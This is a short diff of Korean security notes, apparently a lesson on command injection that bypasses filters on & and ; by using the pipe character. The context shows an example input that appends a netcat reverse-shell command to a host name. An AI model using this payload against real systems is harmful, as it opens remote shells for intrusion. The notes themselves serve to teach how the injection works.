@@ -81,6 +81,7 @@ function commandi_check_1($data)
 ```
 > &와 ; 메타문자가 필터링 되었어도, | 메타문자를 통해 두번 째 인자가 시스템 명령어로 실행이 가능하다.
 
+
 ```shell
 www.nsa.gov | nc 172.20.120.196 5252 -e /bin/bash
 ```
